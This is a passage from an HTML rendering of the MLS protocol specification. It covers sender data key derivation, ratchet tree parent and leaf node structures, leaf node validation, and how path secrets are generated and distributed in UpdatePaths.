<code>KDF.Nh</code> bytes of the ciphertext generated in the previous section. If the
length of the ciphertext is less than <code>KDF.Nh</code>, the whole ciphertext is used.
In pseudocode, the key and nonce are derived as:<a href="#section-6.3.2-5">¬∂</a></p>
<div id="section-6.3.2-6">
<pre>ciphertext_sample = ciphertext[0..KDF.Nh-1]

sender_data_key = ExpandWithLabel(sender_data_secret, "key",
                      ciphertext_sample, AEAD.Nk)
sender_data_nonce = ExpandWithLabel(sender_data_secret, "nonce",
                      ciphertext_sample, AEAD.Nn)
</pre><p><a href="#section-6.3.2-6">¬∂</a>
</p></div>
<p id="section-6.3.2-7">The AAD for the SenderData ciphertext is the
first three fields of PrivateMessage:<a href="#section-6.3.2-7">¬∂</a></p>
<div id="section-6.3.2-8">
<pre>struct {
    opaque group_id&lt;V&gt;;
    uint64 epoch;
    ContentType content_type;
} SenderDataAAD;
</pre><p><a href="#section-6.3.2-8">¬∂</a>
</p></div>
<p id="section-6.3.2-9">When parsing a SenderData struct as part of message decryption, the recipient
<span>MUST</span> verify that the leaf index indicated in the <code>leaf_index</code> field identifies a
non-blank node.<a href="#section-6.3.2-9">¬∂</a></p>
</section>
</section>
</section>
<section id="ratchet-tree-operations">
      <h2 id="name-ratchet-tree-operations">
<a href="#section-7">7. </a><a href="#name-ratchet-tree-operations">Ratchet Tree Operations</a>
      </h2>
<p id="section-7-1">The ratchet tree for an epoch describes the membership of a group in that epoch,
providing public key encryption (HPKE) keys that can be used to encrypt to subsets of
the group as well as information to authenticate the members.  In order to
reflect changes to the membership of the group from one epoch to the next,
corresponding changes are made to the ratchet tree.  In this section, we
describe the content of the tree and the required operations.<a href="#section-7-1">¬∂</a></p>
<section id="parent-node-contents">
        <h3 id="name-parent-node-contents">
<a href="#section-7.1">7.1. </a><a href="#name-parent-node-contents">Parent Node Contents</a>
        </h3>
<p id="section-7.1-1">As discussed in <a href="#ratchet-tree-nodes">Section 4.1.1</a>, the nodes of a ratchet tree contain
several types of data describing individual members (for leaf nodes) or
subgroups of the group (for parent nodes).  Parent nodes are simpler:<a href="#section-7.1-1">¬∂</a></p>
<div id="section-7.1-2">
<pre>struct {
    HPKEPublicKey encryption_key;
    opaque parent_hash&lt;V&gt;;
    uint32 unmerged_leaves&lt;V&gt;;
} ParentNode;
</pre><p><a href="#section-7.1-2">¬∂</a>
</p></div>
<p id="section-7.1-3">The <code>encryption_key</code> field contains an HPKE public key whose private key is held only
by the members at the leaves among its descendants.  The <code>parent_hash</code> field
contains a hash of this node's parent node, as described in <a href="#parent-hashes">Section 7.9</a>.
The <code>unmerged_leaves</code> field lists the leaves under this parent node that are
unmerged, according to their indices among all the leaves in the tree.  The
entries in the <code>unmerged_leaves</code> vector <span>MUST</span> be sorted in increasing order.<a href="#section-7.1-3">¬∂</a></p>
</section>
<section id="leaf-node-contents">
        <h3 id="name-leaf-node-contents">
<a href="#section-7.2">7.2. </a><a href="#name-leaf-node-contents">Leaf Node Contents</a>
        </h3>
<p id="section-7.2-1">A leaf node in the tree describes all the details of an individual client's
appearance in the group, signed by that client. It is also used in client
KeyPackage objects to store the information that will be needed to add a
client to a group.<a href="#section-7.2-1">¬∂</a></p>
<div id="section-7.2-2">
<pre>enum {
    reserved(0),
    key_package(1),
    update(2),
    commit(3),
    (255)
} LeafNodeSource;

struct {
    ProtocolVersion versions&lt;V&gt;;
    CipherSuite cipher_suites&lt;V&gt;;
    ExtensionType extensions&lt;V&gt;;
    ProposalType proposals&lt;V&gt;;
    CredentialType credentials&lt;V&gt;;
} Capabilities;

struct {
    uint64 not_before;
    uint64 not_after;
} Lifetime;

// See the "MLS Extension Types" IANA registry for values
uint16 ExtensionType;

struct {
    ExtensionType extension_type;
    opaque extension_data&lt;V&gt;;
} Extension;

struct {
    HPKEPublicKey encryption_key;
    SignaturePublicKey signature_key;
    Credential credential;
    Capabilities capabilities;

    LeafNodeSource leaf_node_source;
    select (LeafNode.leaf_node_source) {
        case key_package:
            Lifetime lifetime;

        case update:
            struct{};

        case commit:
            opaque parent_hash&lt;V&gt;;
    };

    Extension extensions&lt;V&gt;;
    /* SignWithLabel(., "LeafNodeTBS", LeafNodeTBS) */
    opaque signature&lt;V&gt;;
} LeafNode;

struct {
    HPKEPublicKey encryption_key;
    SignaturePublicKey signature_key;
    Credential credential;
    Capabilities capabilities;

    LeafNodeSource leaf_node_source;
    select (LeafNodeTBS.leaf_node_source) {
        case key_package:
            Lifetime lifetime;

        case update:
            struct{};

        case commit:
            opaque parent_hash&lt;V&gt;;
    };

    Extension extensions&lt;V&gt;;

    select (LeafNodeTBS.leaf_node_source) {
        case key_package:
            struct{};

        case update:
            opaque group_id&lt;V&gt;;
            uint32 leaf_index;

        case commit:
            opaque group_id&lt;V&gt;;
            uint32 leaf_index;
    };
} LeafNodeTBS;
</pre><p><a href="#section-7.2-2">¬∂</a>
</p></div>
<p id="section-7.2-3">The <code>encryption_key</code> field contains an HPKE public key whose private key is held only
by the member occupying this leaf (or in the case of a LeafNode in a KeyPackage
object, the issuer of the KeyPackage). The <code>signature_key</code> field contains the
member's public signing key. The <code>credential</code> field contains information
authenticating both the member's identity and the provided signing key, as
described in <a href="#credentials">Section 5.3</a>.<a href="#section-7.2-3">¬∂</a></p>
<p id="section-7.2-4">The <code>capabilities</code> field indicates the protocol features that the client
supports, including protocol versions, cipher suites, credential types,
non-default proposal types, and non-default extension types.  The following
proposal and extension types are considered "default" and <span>MUST NOT</span> be
listed:<a href="#section-7.2-4">¬∂</a></p>
<ul>
<li id="section-7.2-5.1">
            <p id="section-7.2-5.1.1">Proposal types:<a href="#section-7.2-5.1.1">¬∂</a></p>
<ul>
<li id="section-7.2-5.1.2.1">0x0001 - <code>add</code><a href="#section-7.2-5.1.2.1">¬∂</a>
</li>
              <li id="section-7.2-5.1.2.2">0x0002 - <code>update</code><a href="#section-7.2-5.1.2.2">¬∂</a>
</li>
              <li id="section-7.2-5.1.2.3">0x0003 - <code>remove</code><a href="#section-7.2-5.1.2.3">¬∂</a>
</li>
              <li id="section-7.2-5.1.2.4">0x0004 - <code>psk</code><a href="#section-7.2-5.1.2.4">¬∂</a>
</li>
              <li id="section-7.2-5.1.2.5">0x0005 - <code>reinit</code><a href="#section-7.2-5.1.2.5">¬∂</a>
</li>
              <li id="section-7.2-5.1.2.6">0x0006 - <code>external_init</code><a href="#section-7.2-5.1.2.6">¬∂</a>
</li>
              <li id="section-7.2-5.1.2.7">0x0007 - <code>group_context_extensions</code><a href="#section-7.2-5.1.2.7">¬∂</a>
</li>
            </ul>
</li>
          <li id="section-7.2-5.2">
            <p id="section-7.2-5.2.1">Extension types:<a href="#section-7.2-5.2.1">¬∂</a></p>
<ul>
<li id="section-7.2-5.2.2.1">0x0001 - <code>application_id</code><a href="#section-7.2-5.2.2.1">¬∂</a>
</li>
              <li id="section-7.2-5.2.2.2">0x0002 - <code>ratchet_tree</code><a href="#section-7.2-5.2.2.2">¬∂</a>
</li>
              <li id="section-7.2-5.2.2.3">0x0003 - <code>required_capabilities</code><a href="#section-7.2-5.2.2.3">¬∂</a>
</li>
              <li id="section-7.2-5.2.2.4">0x0004 - <code>external_pub</code><a href="#section-7.2-5.2.2.4">¬∂</a>
</li>
              <li id="section-7.2-5.2.2.5">0x0005 - <code>external_senders</code><a href="#section-7.2-5.2.2.5">¬∂</a>
</li>
            </ul>
</li>
        </ul>
<p id="section-7.2-6">There are no default values for the other fields of a capabilities object.  The
client <span>MUST</span> list all values for the respective parameters that it supports.<a href="#section-7.2-6">¬∂</a></p>
<p id="section-7.2-7">The types of any non-default extensions that appear in the <code>extensions</code> field of a LeafNode
<span>MUST</span> be included in the <code>extensions</code> field of the <code>capabilities</code> field, and the
credential type used in the LeafNode <span>MUST</span> be included in the <code>credentials</code> field
of the <code>capabilities</code> field.<a href="#section-7.2-7">¬∂</a></p>
<p id="section-7.2-8">As discussed in <a href="#extensibility">Section 13</a>, unknown values
in <code>capabilities</code> <span>MUST</span> be ignored, and the creator of a <code>capabilities</code> field
<span>SHOULD</span> include some random GREASE values to help ensure that other clients correctly
ignore unknown values.<a href="#section-7.2-8">¬∂</a></p>
<p id="section-7.2-9">The <code>leaf_node_source</code> field indicates how this LeafNode came to be added to the
tree.  This signal tells other members of the group whether the leaf node is
required to have a <code>lifetime</code> or <code>parent_hash</code>, and whether the <code>group_id</code> is
added as context to the signature.
These fields are included selectively because the client creating a LeafNode is
not always able to compute all of them.
For example, a KeyPackage is created before the client knows which group it will
be used with, so its signature can't bind to a <code>group_id</code>.<a href="#section-7.2-9">¬∂</a></p>
<p id="section-7.2-10">In the case where the leaf was added to the tree based on a pre-published
KeyPackage, the <code>lifetime</code> field represents the times between which clients will
consider a LeafNode valid.  These times are represented as absolute times,
measured in seconds since the Unix epoch (1970-01-01T00:00:00Z).  Applications
<span>MUST</span> define a maximum total lifetime that is acceptable for a LeafNode, and
reject any LeafNode where the total lifetime is longer than this duration. In
order to avoid disagreements about whether a LeafNode has a valid lifetime, the
clients in a group <span>SHOULD</span> maintain time synchronization (e.g., using the Network
Time Protocol <span>[<a href="#RFC5905">RFC5905</a>]</span>).<a href="#section-7.2-10">¬∂</a></p>
<p id="section-7.2-11">In the case where the leaf node was inserted into the tree via a Commit message,
the <code>parent_hash</code> field contains the parent hash for this leaf node (see
<a href="#parent-hashes">Section 7.9</a>).<a href="#section-7.2-11">¬∂</a></p>
<p id="section-7.2-12">The LeafNodeTBS structure covers the fields above the signature in the LeafNode.
In addition, when the leaf node was created in the context of a group (the
<code>update</code> and <code>commit</code> cases), the group ID of the group is added as context to the
signature.<a href="#section-7.2-12">¬∂</a></p>
<p id="section-7.2-13">LeafNode objects stored in the group's ratchet tree
are updated according to the evolution of the tree. Each modification of
LeafNode content <span>MUST</span> be reflected by a change in its signature. This allows other
members to verify the validity of the LeafNode at any time, particularly in the
case of a newcomer joining the group.<a href="#section-7.2-13">¬∂</a></p>
</section>
<section id="leaf-node-validation">
        <h3 id="name-leaf-node-validation">
<a href="#section-7.3">7.3. </a><a href="#name-leaf-node-validation">Leaf Node Validation</a>
        </h3>
<p id="section-7.3-1">The validity of a LeafNode needs to be verified at the following stages:<a href="#section-7.3-1">¬∂</a></p>
<ul>
<li id="section-7.3-2.1">When a LeafNode is downloaded in a KeyPackage, before it is used
to add the client to the group<a href="#section-7.3-2.1">¬∂</a>
</li>
          <li id="section-7.3-2.2">When a LeafNode is received by a group member in an Add, Update, or Commit
message<a href="#section-7.3-2.2">¬∂</a>
</li>
          <li id="section-7.3-2.3">When a client validates a ratchet tree, e.g., when joining a group or after
processing a Commit<a href="#section-7.3-2.3">¬∂</a>
</li>
        </ul>
<p id="section-7.3-3">The client verifies the validity of a LeafNode using the following steps:<a href="#section-7.3-3">¬∂</a></p>
<ul>
<li id="section-7.3-4.1">Verify that the credential in the LeafNode is valid, as described in
<a href="#credential-validation">Section 5.3.1</a>.<a href="#section-7.3-4.1">¬∂</a>
</li>
          <li id="section-7.3-4.2">Verify that the signature on the LeafNode is valid using <code>signature_key</code>.<a href="#section-7.3-4.2">¬∂</a>
</li>
          <li id="section-7.3-4.3">Verify that the LeafNode is compatible with the group's parameters.  If the
GroupContext has a <code>required_capabilities</code> extension, then the required
extensions, proposals, and credential types <span>MUST</span> be listed in the LeafNode's
<code>capabilities</code> field.<a href="#section-7.3-4.3">¬∂</a>
</li>
          <li id="section-7.3-4.4">Verify that the credential type is supported by all members of the group, as
specified by the <code>capabilities</code> field of each member's LeafNode, and that the
<code>capabilities</code> field of this LeafNode indicates support for all the credential
types currently in use by other members.<a href="#section-7.3-4.4">¬∂</a>
</li>
          <li id="section-7.3-4.5">
            <p id="section-7.3-4.5.1">Verify the <code>lifetime</code> field:<a href="#section-7.3-4.5.1">¬∂</a></p>
<ul>
<li id="section-7.3-4.5.2.1">If the LeafNode appears in a message being sent by the client, e.g., a
Proposal or a Commit, then the client <span>MUST</span> verify that the current time is within
the range of the <code>lifetime</code> field.<a href="#section-7.3-4.5.2.1">¬∂</a>
</li>
              <li id="section-7.3-4.5.2.2">If instead the LeafNode appears in a message being received by the client, e.g.,
a Proposal, a Commit, or a ratchet tree of the group the client is joining, it is
<span>RECOMMENDED</span> that the client verifies that the current time is within the range
of the <code>lifetime</code> field.  (This check is not mandatory because the LeafNode
might have expired in the time between when the message was sent and when it
was received.)<a href="#section-7.3-4.5.2.2">¬∂</a>
</li>
            </ul>
</li>
          <li id="section-7.3-4.6">Verify that the extensions in the LeafNode are supported by checking that the
ID for each extension in the <code>extensions</code> field is listed in the
<code>capabilities.extensions</code> field of the LeafNode.<a href="#section-7.3-4.6">¬∂</a>
</li>
          <li id="section-7.3-4.7">
            <p id="section-7.3-4.7.1">Verify the <code>leaf_node_source</code> field:<a href="#section-7.3-4.7.1">¬∂</a></p>
<ul>
<li id="section-7.3-4.7.2.1">If the LeafNode appears in a KeyPackage, verify that <code>leaf_node_source</code> is
set to <code>key_package</code>.<a href="#section-7.3-4.7.2.1">¬∂</a>
</li>
              <li id="section-7.3-4.7.2.2">If the LeafNode appears in an Update proposal, verify that <code>leaf_node_source</code>
is set to <code>update</code> and that <code>encryption_key</code> represents a different public
key than the <code>encryption_key</code> in the leaf node being replaced by the Update
proposal.<a href="#section-7.3-4.7.2.2">¬∂</a>
</li>
              <li id="section-7.3-4.7.2.3">If the LeafNode appears in the <code>leaf_node</code> value of the UpdatePath in
a Commit, verify that <code>leaf_node_source</code> is set to <code>commit</code>.<a href="#section-7.3-4.7.2.3">¬∂</a>
</li>
            </ul>
</li>
          <li id="section-7.3-4.8">
            <p id="section-7.3-4.8.1">Verify that the following fields are unique among the members of the group:<a href="#section-7.3-4.8.1">¬∂</a></p>
<ul>
<li id="section-7.3-4.8.2.1">
                <code>signature_key</code><a href="#section-7.3-4.8.2.1">¬∂</a>
</li>
              <li id="section-7.3-4.8.2.2">
                <code>encryption_key</code><a href="#section-7.3-4.8.2.2">¬∂</a>
</li>
            </ul>
</li>
        </ul>
</section>
<section id="ratchet-tree-evolution">
        <h3 id="name-ratchet-tree-evolution">
<a href="#section-7.4">7.4. </a><a href="#name-ratchet-tree-evolution">Ratchet Tree Evolution</a>
        </h3>
<p id="section-7.4-1">Whenever a member initiates an epoch change (i.e., commits; see <a href="#commit">Section 12.4</a>),
they may need to refresh the key pairs of their leaf and of the nodes on their
leaf's direct path in order to maintain forward secrecy and post-compromise
security.<a href="#section-7.4-1">¬∂</a></p>
<p id="section-7.4-2">The member initiating the epoch change generates the fresh key pairs using the
following procedure. The procedure is designed in a way that allows group members to
efficiently communicate the fresh secret keys to other group members, as
described in <a href="#update-paths">Section 7.6</a>.<a href="#section-7.4-2">¬∂</a></p>
<p id="section-7.4-3">A member updates the nodes along its direct path as follows:<a href="#section-7.4-3">¬∂</a></p>
<ul>
<li id="section-7.4-4.1">Blank all the nodes on the direct path from the leaf to the root.<a href="#section-7.4-4.1">¬∂</a>
</li>
          <li id="section-7.4-4.2">Generate a fresh HPKE key pair for the leaf.<a href="#section-7.4-4.2">¬∂</a>
</li>
          <li id="section-7.4-4.3">Generate a sequence of path secrets, one for each node on the leaf's filtered direct
path, as follows. In this setting, <code>path_secret[0]</code> refers to the first parent node
in the filtered direct path, <code>path_secret[1]</code> to the second parent node, and so on.<a href="#section-7.4-4.3">¬∂</a>
</li>
        </ul>
<div id="section-7.4-5">
<pre>path_secret[0] is sampled at random
path_secret[n] = DeriveSecret(path_secret[n-1], "path")
</pre><p><a href="#section-7.4-5">¬∂</a>
</p></div>
<ul>
<li id="section-7.4-6.1">Compute the sequence of HPKE key pairs <code>(node_priv,node_pub)</code>, one for each
node on the leaf's direct path, as follows.<a href="#section-7.4-6.1">¬∂</a>
</li>
        </ul>
<div id="section-7.4-7">
<pre>node_secret[n] = DeriveSecret(path_secret[n], "node")
node_priv[n], node_pub[n] = KEM.DeriveKeyPair(node_secret[n])
</pre><p><a href="#section-7.4-7">¬∂</a>
</p></div>
<p id="section-7.4-8">The node secret is derived as a temporary intermediate secret so that each
secret is only used with one algorithm: The path secret is used as an input to
DeriveSecret, and the node secret is used as an input to DeriveKeyPair.<a href="#section-7.4-8">¬∂</a></p>
<p id="section-7.4-9">For example, suppose there is a group with four members, with C an unmerged leaf
at Z:<a href="#section-7.4-9">¬∂</a></p>
<span id="name-a-full-tree-with-one-unmerg"></span><div id="evolution-tree">
<figure id="figure-13">
          <div id="section-7.4-10.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="176" text-anchor="middle" version="1.1" viewBox="0 0 120 176" width="120">
                <path d="M 56,48 L 56,64" fill="none" stroke="black"></path>
                <path d="M 40,64 L 72,64" fill="none" stroke="black"></path>
                <path d="M 72,64 L 80,80" fill="none" stroke="black"></path>
                <path d="M 32,80 L 40,64" fill="none" stroke="black"></path>
                <g>
                  <text x="56" y="36">Y</text>
                  <text x="24" y="100">X</text>
                  <text x="100" y="100">Z[C]</text>
                  <text x="16" y="116">/</text>
                  <text x="32" y="116">\</text>
                  <text x="80" y="116">/</text>
                  <text x="96" y="116">\</text>
                  <text x="8" y="132">A</text>
                  <text x="40" y="132">B</text>
                  <text x="72" y="132">C</text>
                  <text x="104" y="132">D</text>
                  <text x="8" y="164">0</text>
                  <text x="40" y="164">1</text>
                  <text x="72" y="164">2</text>
                  <text x="104" y="164">3</text>
                </g>
              </svg><p><a href="#section-7.4-10.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-13">Figure 13</a>:
<a href="#name-a-full-tree-with-one-unmerg">A Full Tree with One Unmerged Leaf</a>
          </figcaption></figure>
</div>
<p id="section-7.4-11">If member B subsequently generates an UpdatePath based on a secret
"leaf_secret", then it would generate the following sequence
of path secrets:<a href="#section-7.4-11">¬∂</a></p>
<span id="name-derivation-of-ratchet-tree-"></span><figure id="figure-14">
          <div id="section-7.4-12.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="272" text-anchor="middle" version="1.1" viewBox="0 0 560 272" width="560">
                <path d="M 48,64 L 48,96" fill="none" stroke="black"></path>
                <path d="M 48,144 L 48,176" fill="none" stroke="black"></path>
                <path d="M 128,32 L 152,32" fill="none" stroke="black"></path>
                <path d="M 288,32 L 344,32" fill="none" stroke="black"></path>
                <path d="M 128,112 L 152,112" fill="none" stroke="black"></path>
                <path d="M 288,112 L 344,112" fill="none" stroke="black"></path>
                <path d="M 104,192 L 152,192" fill="none" stroke="black"></path>
                <path d="M 304,192 L 344,192" fill="none" stroke="black"></path>
                <path d="M 368,224 L 416,224" fill="none" stroke="black"></path>
                <path d="M 448,224 L 496,224" fill="none" stroke="black"></path>
                <path d="M 368,224 C 359.16936,224 352,216.83064 352,208" fill="none" stroke="black"></path>
                <path d="M 416,224 C 424.83064,224 432,231.16936 432,240" fill="none" stroke="black"></path>
                <path d="M 448,224 C 439.16936,224 432,231.16936 432,240" fill="none" stroke="black"></path>
                <path d="M 496,224 C 504.83064,224 512,216.83064 512,208" fill="none" stroke="black"></path>
                <polygon fill="black" points="352,192 340,186.4 340,197.6" transform="rotate(0,344,192)"></polygon>
                <polygon fill="black" points="352,112 340,106.4 340,117.6" transform="rotate(0,344,112)"></polygon>
                <polygon fill="black" points="352,32 340,26.4 340,37.6" transform="rotate(0,344,32)"></polygon>
                <polygon fill="black" points="160,192 148,186.4 148,197.6" transform="rotate(0,152,192)"></polygon>
                <polygon fill="black" points="160,112 148,106.4 148,117.6" transform="rotate(0,152,112)"></polygon>
                <polygon fill="black" points="160,32 148,26.4 148,37.6" transform="rotate(0,152,32)"></polygon>
                <polygon fill="black" points="56,144 44,138.4 44,149.6" transform="rotate(270,48,144)"></polygon>
                <polygon fill="black" points="56,64 44,58.4 44,69.6" transform="rotate(270,48,64)"></polygon>
                <g>
                  <text x="60" y="36">path_secret[1]</text>
                  <text x="220" y="36">node_secret[1]</text>
                  <text x="408" y="36">node_priv[1],</text>
                  <text x="512" y="36">node_pub[1]</text>
                  <text x="60" y="116">path_secret[0]</text>
                  <text x="220" y="116">node_secret[0]</text>
                  <text x="408" y="116">node_priv[0],</text>
                  <text x="512" y="116">node_pub[0]</text>
                  <text x="48" y="196">leaf_secret</text>
                  <text x="228" y="196">leaf_node_secret</text>
                  <text x="396" y="196">leaf_priv,</text>
                  <text x="476" y="196">leaf_pub</text>
                  <text x="432" y="260">leaf_node</text>
                </g>
              </svg><p><a href="#section-7.4-12.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-14">Figure 14</a>:
<a href="#name-derivation-of-ratchet-tree-">Derivation of Ratchet Tree Keys along a Direct Path</a>
          </figcaption></figure>
<p id="section-7.4-13">After applying the UpdatePath, the tree will have the following structure:<a href="#section-7.4-13">¬∂</a></p>
<span id="name-placement-of-keys-in-a-ratc"></span><figure id="figure-15">
          <div id="section-7.4-14.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="192" text-anchor="middle" version="1.1" viewBox="0 0 256 192" width="256">
                <path d="M 176,144 L 176,160" fill="none" stroke="black"></path>
                <path d="M 192,48 L 192,64" fill="none" stroke="black"></path>
                <path d="M 112,32 L 176,32" fill="none" stroke="black"></path>
                <path d="M 176,64 L 208,64" fill="none" stroke="black"></path>
                <path d="M 112,96 L 144,96" fill="none" stroke="black"></path>
                <path d="M 88,160 L 176,160" fill="none" stroke="black"></path>
                <path d="M 208,64 L 216,80" fill="none" stroke="black"></path>
                <path d="M 168,80 L 176,64" fill="none" stroke="black"></path>
                <polygon fill="black" points="184,144 172,138.4 172,149.6" transform="rotate(270,176,144)"></polygon>
                <polygon fill="black" points="184,32 172,26.4 172,37.6" transform="rotate(0,176,32)"></polygon>
                <polygon fill="black" points="152,96 140,90.4 140,101.6" transform="rotate(0,144,96)"></polygon>
                <g>
                  <text x="52" y="36">node_priv[1]</text>
                  <text x="196" y="36">Y'</text>
                  <text x="52" y="100">node_priv[0]</text>
                  <text x="164" y="100">X'</text>
                  <text x="236" y="100">Z[C]</text>
                  <text x="152" y="116">/</text>
                  <text x="168" y="116">\</text>
                  <text x="216" y="116">/</text>
                  <text x="232" y="116">\</text>
                  <text x="144" y="132">A</text>
                  <text x="176" y="132">B</text>
                  <text x="208" y="132">C</text>
                  <text x="240" y="132">D</text>
                  <text x="40" y="164">leaf_priv</text>
                  <text x="144" y="180">0</text>
                  <text x="176" y="180">1</text>
                  <text x="208" y="180">2</text>
                  <text x="240" y="180">3</text>
                </g>
              </svg><p><a href="#section-7.4-14.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-15">Figure 15</a>:
<a href="#name-placement-of-keys-in-a-ratc">Placement of Keys in a Ratchet Tree</a>
          </figcaption></figure>
</section>
<section id="synchronizing-views-of-the-tree">
        <h3 id="name-synchronizing-views-of-the-">
<a href="#section-7.5">7.5. </a><a href="#name-synchronizing-views-of-the-">Synchronizing Views of the Tree</a>
        </h3>
<p id="section-7.5-1">After generating fresh key material and applying it to update their
local tree state as described in <a href="#ratchet-tree-evolution">Section 7.4</a>, the
generator broadcasts
this update to other members of the group in a Commit message, who
apply it to keep their local views of the tree in
sync with the sender's.  More specifically, when a member commits a change to
the tree (e.g., to add or remove a member), it transmits an UpdatePath
containing a set of public keys and encrypted path secrets
for intermediate nodes in the filtered direct path of its leaf. The
other members of the group use these values to update
their view of the tree, aligning their copy of the tree to the
sender's.<a href="#section-7.5-1">¬∂</a></p>
<p id="section-7.5-2">An UpdatePath contains
the following information for each node in the filtered direct path of the
sender's leaf, including the root:<a href="#section-7.5-2">¬∂</a></p>
<ul>
<li id="section-7.5-3.1">The public key for the node<a href="#section-7.5-3.1">¬∂</a>
</li>
          <li id="section-7.5-3.2">One or more encrypted copies of the path secret corresponding to
the node<a href="#section-7.5-3.2">¬∂</a>
</li>
        </ul>
<p id="section-7.5-4">The path secret value for a given node is encrypted to the subtree
rooted at the parent's non-updated child, i.e., the child
on the copath of the sender's leaf node.
There is one encryption of the path secret to each public key in the resolution
of the non-updated child.<a href="#section-7.5-4">¬∂</a></p>
<p id="section-7.5-5">A member of the group <em>updates their direct path</em> by computing new values for
their leaf node and the nodes along their filtered direct path as follows:<a href="#section-7.5-5">¬∂</a></p>
<ol start="1" type="1" id="section-7.5-6">
          <li id="section-7.5-6.1">Blank all nodes along the direct path of the sender's leaf.<a href="#section-7.5-6.1">¬∂</a>
</li>
          <li id="section-7.5-6.2">
            <p id="section-7.5-6.2.1">Compute updated path secrets and public keys for the nodes on the sender's
filtered direct path.<a href="#section-7.5-6.2.1">¬∂</a></p>
<ul>
<li id="section-7.5-6.2.2.1">Generate a sequence of path secrets of the same length as the filtered
direct path, as defined in <a href="#ratchet-tree-evolution">Section 7.4</a>.<a href="#section-7.5-6.2.2.1">¬∂</a>
</li>
              <li id="section-7.5-6.2.2.2">For each node in the filtered direct path, replace the node's public key
with the <code>node_pub[n]</code> value derived from the corresponding path secret
<code>path_secret[n]</code>.<a href="#section-7.5-6.2.2.2">¬∂</a>
</li>
            </ul>
</li>
          <li id="section-7.5-6.3">Compute the new parent hashes for the nodes along the filtered direct path
and the sender's leaf node.<a href="#section-7.5-6.3">¬∂</a>
</li>
          <li id="section-7.5-6.4">
            <p id="section-7.5-6.4.1">Update the leaf node for the sender.<a href="#section-7.5-6.4.1">¬∂</a></p>
<ul>
<li id="section-7.5-6.4.2.1">Set the <code>leaf_node_source</code> to <code>commit</code>.<a href="#section-7.5-6.4.2.1">¬∂</a>
</li>
              <li id="section-7.5-6.4.2.2">Set the <code>encryption_key</code> to the public key of a freshly sampled key pair.<a href="#section-7.5-6.4.2.2">¬∂</a>
</li>
              <li id="section-7.5-6.4.2.3">Set the parent hash to the parent hash for the leaf.<a href="#section-7.5-6.4.2.3">¬∂</a>
</li>
              <li id="section-7.5-6.4.2.4">Re-sign the leaf node with its new contents.<a href="#section-7.5-6.4.2.4">¬∂</a>
</li>
            </ul>
</li>
        </ol>
<p id="section-7.5-7">Since the new leaf node effectively updates an existing leaf node in the group,
it <span>MUST</span> adhere to the same restrictions as LeafNodes used in Update proposals
(aside from <code>leaf_node_source</code>). The application <span>MAY</span> specify other changes to
the leaf node, e.g., providing a new signature key, updated capabilities, or
different extensions.<a href="#section-7.5-7">¬∂</a></p>
<p id="section-7.5-8">The member then <em>encrypts path secrets to the group</em>.  For each node in the
member's filtered direct path, the member takes the following steps:<a href="#section-7.5-8">¬∂</a></p>
<ol start="1" type="1" id="section-7.5-9">
          <li id="section-7.5-9.1">Compute the resolution of the node's child that is on the copath of the
sender (the child that is not in the direct path of the sender).  Any new
member (from an Add proposal) added in the same Commit <span>MUST</span> be excluded from
this resolution.<a href="#section-7.5-9.1">¬∂</a>
</li>
          <li id="section-7.5-9.2">For each node in the resolution, encrypt the path secret for the direct
path node using the public key of the resolution node, as defined in
<a href="#update-paths">Section 7.6</a>.<a href="#section-7.5-9.2">¬∂</a>
</li>
        </ol>
<p id="section-7.5-10">The recipient of an UpdatePath performs the corresponding steps. First, the
recipient <em>merges UpdatePath into the tree</em>:<a href="#section-7.5-10">¬∂</a></p>
<ol start="1" type="1" id="section-7.5-11">
          <li id="section-7.5-11.1">Blank all nodes on the direct path of the sender's leaf.<a href="#section-7.5-11.1">¬∂</a>
</li>
          <li id="section-7.5-11.2">
            <p id="section-7.5-11.2.1">For all nodes on the filtered direct path of the sender's leaf,<a href="#section-7.5-11.2.1">¬∂</a></p>
<ul>
<li id="section-7.5-11.2.2.1">Set the public key to the public key in the UpdatePath.<a href="#section-7.5-11.2.2.1">¬∂</a>
</li>
              <li id="section-7.5-11.2.2.2">Set the list of unmerged leaves to the empty list.<a href="#section-7.5-11.2.2.2">¬∂</a>
</li>
            </ul>
</li>
          <li id="section-7.5-11.3">
            <p id="section-7.5-11.3.1">Compute parent hashes for the nodes in the sender's filtered direct path,
and verify that the <code>parent_hash</code> field of the leaf node matches the parent
hash for the first node in its filtered direct path.<a href="#section-7.5-11.3.1">¬∂</a></p>
<ul>
<li id="section-7.5-11.3.2.1">Note that these hashes are computed from root to leaf, so that
each hash incorporates all the non-blank nodes above it. The root node
always has a zero-length hash for its parent hash.<a href="#section-7.5-11.3.2.1">¬∂</a>
</li>
            </ul>
</li>
        </ol>
<p id="section-7.5-12">Second, the recipient <em>decrypts the path secrets</em>:<a href="#section-7.5-12">¬∂</a></p>
<ol start="1" type="1" id="section-7.5-13">
          <li id="section-7.5-13.1">Identify a node in the filtered direct path for which the recipient
is in the subtree of the non-updated child.<a href="#section-7.5-13.1">¬∂</a>
</li>
          <li id="section-7.5-13.2">Identify a node in the resolution of the copath node for
which the recipient has a private key.<a href="#section-7.5-13.2">¬∂</a>
</li>
          <li id="section-7.5-13.3">Decrypt the path secret for the parent of the copath node using
the private key from the resolution node.<a href="#section-7.5-13.3">¬∂</a>
</li>
          <li id="section-7.5-13.4">Derive path secrets for ancestors of that node in the sender's filtered
direct path using the algorithm described above.<a href="#section-7.5-13.4">¬∂</a>
</li>
          <li id="section-7.5-13.5">Derive the node secrets and node key pairs from the path secrets.<a href="#section-7.5-13.5">¬∂</a>
</li>
          <li id="section-7.5-13.6">Verify that the derived public keys are the same as the corresponding public
keys sent in the UpdatePath.<a href="#section-7.5-13.6">¬∂</a>
</li>
          <li id="section-7.5-13.7">Store the derived private keys in the corresponding ratchet tree nodes.<a href="#section-7.5-13.7">¬∂</a>
</li>
        </ol>
<p id="section-7.5-14">For example, in order to communicate the example update described in
<a href="#ratchet-tree-evolution">Section 7.4</a>, the member at node B would transmit the following
values:<a href="#section-7.5-14">¬∂</a></p>
<table id="table-3">
          <caption><a href="#table-3">Table 3</a></caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Public Key</th>
              <th rowspan="1" colspan="1">Ciphertext(s)</th>
            </tr>
          </thead>
